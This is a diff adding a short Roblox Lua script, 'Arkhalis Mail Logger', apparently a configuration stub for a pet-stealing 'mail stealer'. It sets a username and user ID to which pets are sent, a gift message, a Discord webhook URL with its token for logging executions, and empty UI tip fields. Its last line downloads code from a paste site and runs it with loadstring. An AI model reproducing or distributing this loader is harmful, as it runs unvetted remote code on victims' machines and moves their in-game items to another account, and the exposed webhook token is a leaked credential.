@@ -1,0 +1,20 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "" --// Username To Send Pets To
+_G.UserID = 1410060179 --// Replace The User ID To Your User ID
+_G.GiftMessage = "lol" --// Message For The Gift To Say
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1100059723409150014/NslQqlT-9wFSCzgYeOgyrP8DevN3PDEMfBQgXU4We2_EgCsCCf2rzKiz2-5qPk4lZwRK" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "" --// Script Name On The UI
+_G.Tip1 = "" --// Gives You Tips On The UI
+_G.Tip2 = "" --// Gives You Tips On The UI
+_G.Tip3 = "" --// Gives You Tips On The UI
+_G.Tip4 = "" --// Gives You Tips On The UI
+_G.Tip5 = "" --// Gives You Tips On The UI
+
+--[[ Script ]]
+loadstring(game:HttpGet("https://paste.xyzo.space/nxll/Arkhalis.lua"))()
